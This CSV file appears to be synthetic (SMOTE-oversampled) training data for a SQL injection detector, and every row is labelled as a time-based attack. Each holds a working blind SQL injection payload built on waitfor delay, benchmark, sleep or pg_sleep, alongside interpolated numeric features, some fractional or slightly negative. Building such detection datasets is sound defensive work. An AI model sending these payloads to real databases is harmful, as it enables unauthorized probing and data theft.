id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000061,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000108,0.2805432306536763,64.30952449282753,27.704081925497512,4.280499777590487,26.605442567330016,12.0,14.098639358167496,11.605442567330016,0.41352695107960424,0.18681318463821478,0.21964939400034533,0.18001047028183575,4.704081925497512,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-5.551115123125783e-17,3.901360641832504,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.901360641832504,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.901360641832504
SMOTE_000062,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000043,0.04622632277998702,108.84152540771703,30.0,3.795248171811306,26.0,29.0,41.88114405578777,11.960381351929257,0.23890638017979446,0.26647250096977076,0.38474889953281427,0.10987221931762056,0.9801906759646288,0.0,2.0,0.0,0.0,2.0,0.0,5.980190675964629,0.0,0.0,1.0,4.0,0.9801906759646288,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000063,attack,time,"1%"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,0.036020540685258264,27.0,15.0,3.27436274471765,9.999999999999998,2.0,10.0,5.0,0.37037037037037035,0.07407407407407407,0.37037037037037035,0.18518518518518517,0.010994375536917955,0.9890056244630823,0.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,-5.551115123125783e-17,0.0,0.010994375536917511,0.9890056244630823,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000064,attack,time,1 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000255,0.005606815964227042,25.00989774719931,17.99010225280069,4.052635313432234,12.000000000000002,4.009897747199309,3.0,6.0,0.47981727235939736,0.16031977337105457,0.1199543180898493,0.23990863617969868,2.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000065,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",nearest_attack_euclidean,R000196,0.44066750534119414,103.32231730995481,20.367768269004518,2.8968484901774967,22.0,10.0,55.057853847963855,16.264463461990964,0.2134029308392903,0.09700133219967741,0.5322763231288903,0.15731941383214193,0.0,4.0,0.0,0.0,0.0,2.0,0.0,9.264463461990964,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000066,attack,time,waitfor delay '0:0:5'# ogzq,nearest_attack_euclidean,R000173,0.25491755605103794,26.619226253610933,19.714419690208196,4.185620063939536,15.619226253610929,3.0951934365972686,3.0,4.904806563402732,0.5858478080349762,0.11708944287808928,0.11295059780864286,0.18411215127829167,2.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.9048065634027322,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000067,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000202,0.8768463775577726,23.024447428402873,17.34963161893525,4.008834430182813,12.000000000000002,3.6748158094676233,2.6748158094676207,4.674815809467623,0.523227442180884,0.1589241859397053,0.11532189909129831,0.2025264727881123,2.0,0.6748158094676233,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,0.6748158094676232,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000068,attack,time,"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",nearest_attack_euclidean,R000216,0.786108758016081,61.96077896181802,25.245097370227253,3.812033845837571,19.01961051909099,16.470584221363517,20.225486851136264,6.245097370227253,0.30930417938948507,0.26441749236630896,0.3255574536258905,0.10072087461831544,0.0,0.0,0.0,0.0,0.0,0.24509737022725253,0.0,4.0,0.0,0.0,1.0,0.24509737022725253,0.0,0.0,0.0,1.0,0.0,0.24509737022725248,1.0,0.0,0.0,1.0,0.0,0.7549026297727475,0.0,0.0,0.0,0.24509737022725248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000069,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.0618707414816209,32.58417468334838,16.0,3.179111392783348,10.999999999999998,0.0,13.29208734167419,8.292087341674188,0.3378438221352646,0.0,0.4078607757812915,0.2542954020834439,0.7079126583258112,0.5841746833483775,0.0,0.0,0.0,1.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.9999999999999999,0.7079126583258112,0.29208734167418887,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000070,attack,time,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000089,1.9711198347952776,116.15570134409464,32.23615667002957,3.9620631762581344,35.23615667002957,22.919544674065058,41.0,17.0,0.30331030698554867,0.1950405684608725,0.35461403632235744,0.14703508823122138,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.44723133400591414,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5527686659940858,0.4472313340059142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000071,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000107,3.7858189313224067,156.71992266409043,30.660009666988696,3.913965711507638,66.69995166505652,19.320019333977392,53.039941998067825,17.660009666988696,0.4254849119469627,0.12349224483528576,0.3382008582585311,0.11282198495922043,2.320019333977391,0.0,0.0,0.0,1.0,1.0,0.0,8.679980666022608,0.0,0.679980666022609,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.33999033301130455,0.0,0.6600096669886955,0.6600096669886955,0.3399903330113046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000072,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000172,0.6261281886222794,90.35194519198791,27.213813199271627,3.787655709701004,26.0,21.213813199271627,31.710505594173025,11.427626398543257,0.28843542527643645,0.23512680354730914,0.3500879403727719,0.1263498308034825,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.427626398543256,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.2138131992716281,0.7861868007283719,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000073,attack,time,1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000228,1.463232166039873,108.06706131441871,28.092398764865855,3.7268180358796794,31.974662549552857,18.0,41.09239876486586,17.0,0.2943556150383536,0.16709892643763197,0.380729805777362,0.15781565274665238,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.6974662549552858,0.3025337450447142,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,1.6974662549552857,0.0,1.0,0.6974662549552859,0.6974662549552858,0.3025337450447142,0.0,0.0,0.0,0.0,0.0,0.0,0.3025337450447142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.697466254955286
SMOTE_000074,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.667636908016382,41.59762961317371,17.0,3.1959581335874727,13.0,0.0,17.16469134431142,11.432938268862285,0.3186739495143042,0.0,0.4043491705256161,0.2769768799600797,0.0,1.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,3.4329382688622845,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000075,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000063,0.8664694124377164,59.372780137758355,24.372780137758355,3.792487759603258,20.0,15.0,19.0,5.372780137758354,0.3368769483742466,0.2526577112806849,0.3200331009555342,0.0904322393895342,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.37278013775835306,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000076,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.6480651557156875,39.63105915448059,17.0,3.2664461018424467,13.0,1.0,15.525882628733825,10.105176525746765,0.33588971783956384,0.025837670603043386,0.3811740977800743,0.25709851377731846,0.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,3.1051765257467654,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000077,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.9080283966051877,33.947063136217096,22.736765784054274,4.290069393470356,16.0,2.0,4.210297352162819,11.736765784054272,0.4726700367009461,0.05908375458761825,0.12223510750655595,0.34601110120487966,2.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.7367657840542727,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.736765784054273,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000078,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000071,0.0952802860710104,45.74637073189381,21.08454308936873,4.145463313959083,27.0,3.9154569106312698,6.915456910631271,7.915456910631271,0.590418599716313,0.0855033038227822,0.1511053704579281,0.17297272600297672,2.0,3.9154569106312698,0.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,-5.551115123125783e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000079,attack,time,1%' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000167,1.0050743371566524,27.0,19.39099406524737,4.146271563624325,12.000000000000002,4.0,3.0,8.0,0.4444444444444444,0.14814814814814814,0.11111111111111113,0.2962962962962963,2.609005934752631,0.3909940652473689,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,-5.551115123125783e-17,2.0,1.0,0.3909940652473689,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000080,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000223,0.34166763946166806,65.3731754793651,27.880473561904708,4.046124603972757,23.0,12.0,21.0,9.373175479365097,0.35184544614792607,0.18357153712065707,0.3212501899611499,0.143332826770267,2.373175479365097,0.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,-5.551115123125783e-17,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000081,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000231,0.5178922154651127,85.41929118938316,28.68553160796263,3.7163558743510143,31.79035440530842,10.943405176112112,33.68553160796263,9.0,0.37234141525326564,0.12769286557510878,0.39458219249673443,0.10538352667489115,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.8951772026542097,0.10482279734579025,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.10482279734579025,0.0,0.8951772026542097,0.0,0.0,0.8951772026542097,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.10482279734579025,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8951772026542097
SMOTE_000082,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000067,0.07441837981290997,32.90953571318633,15.939690475457557,3.484719527396357,16.939690475457557,1.0,10.0,4.969845237728777,0.5146946248140724,0.030394408370518863,0.30394408370518855,0.15096688311022022,0.0,0.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,0.0,0.9698452377287777,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.030154762271222102,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0301547622712222
SMOTE_000083,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",nearest_attack_euclidean,R000196,0.4437227724804901,103.29681894001496,20.370318105998507,2.897290876948931,22.0,10.0,55.03745515201196,16.25936378800299,0.2134569788341527,0.09702589947006943,0.5322085174626083,0.15730860423316945,0.0,4.0,0.0,0.0,0.0,2.0,0.0,9.25936378800299,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000084,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000247,0.6181684480522831,79.51900655011212,27.394214753579437,3.852383860221178,20.37975163752803,23.576859014317748,27.168181144686905,8.394214753579437,0.2563911627881484,0.2966705647796829,0.3408148172965061,0.10612345513566263,0.0,0.0,2.0,0.0,0.0,1.1971073767897187,0.0,4.1971073767897185,0.0,0.0,1.0,3.1971073767897185,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.0,0.19710737678971868,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1971073767897185
SMOTE_000085,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000093,2.443055061750971,37.3044724846355,20.15223624231775,3.900125758114158,15.0,3.576118121158875,8.576118121158874,10.152236242317748,0.40324755511389565,0.09542177053967335,0.22983762224430523,0.2714930521021258,3.271645636523376,2.3044724846354985,0.0,0.0,0.0,1.0,0.0,0.0,1.5761181211588748,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.5761181211588746,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000086,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000244,1.9640973621357654,178.68975744686216,32.9228340425583,3.781643755765272,61.34645744680212,29.96062765959363,68.4598382979081,18.9228340425583,0.3490199668591989,0.1653295697770084,0.37962118458894084,0.10602927877485184,1.2692914893604248,0.0,0.0,0.0,1.0,1.0,0.0,12.384251063837452,0.0,0.0,1.4614170212791504,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.7307085106395752,0.0,2.730708510639575,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7307085106395753,0.26929148936042474,0.26929148936042474,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000087,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,1.3121343071821414,41.64877985674519,16.0,2.8609178943192632,10.999999999999998,0.6756100716273998,20.648779856745197,9.324389928372598,0.26424470877810713,0.01647829442993659,0.49553282869634097,0.22374416809561531,0.32438992837259906,0.0,0.0,0.0,0.0,0.32438992837259917,0.0,4.0,0.0,4.0,-5.551115123125783e-17,0.32438992837259906,0.32438992837259895,0.0,0.0,0.6756100716274009,0.0,0.32438992837259906,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000088,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000093,1.6004333733934737,35.0,19.59610179176078,3.8872658446229047,15.0,3.0,8.0,9.0,0.42857142857142855,0.08571428571428572,0.22857142857142856,0.2571428571428571,3.211694624717654,1.7883053752823463,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.596101791760782,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000164,0.5883745321680457,92.11258820926335,20.20364215794736,3.073338737543118,22.0,10.0,45.92715684105279,14.185431368210558,0.24198885177181279,0.10999493262355127,0.49418229107738354,0.15383392452725236,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.185431368210558,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.4117377472979098,34.83575006127048,17.0,3.439891194941401,13.0,0.0,11.468600049016384,10.367150012254097,0.37490849218778605,0.0,0.327038517547716,0.29805299026449794,0.0,1.0,2.0,0.0,0.0,1.1102230246251565e-16,0.0,2.367150012254096,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000091,attack,time,1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000170,1.6813070110502593,119.1983406856146,31.4002370449122,3.965655805908392,42.5997629550878,18.0,42.399051820351204,16.199525910175602,0.3575653906656653,0.151135414658513,0.3555208362021243,0.13577835847369743,3.5997629550878,0.0,0.8004740898243992,0.0,0.0,2.0,0.0,5.5997629550878,0.0,1.0,-5.551115123125783e-17,6.0,1.0,0.0,0.4002370449121996,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,1.0,2.0,0.5997629550878004,0.4002370449121995,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
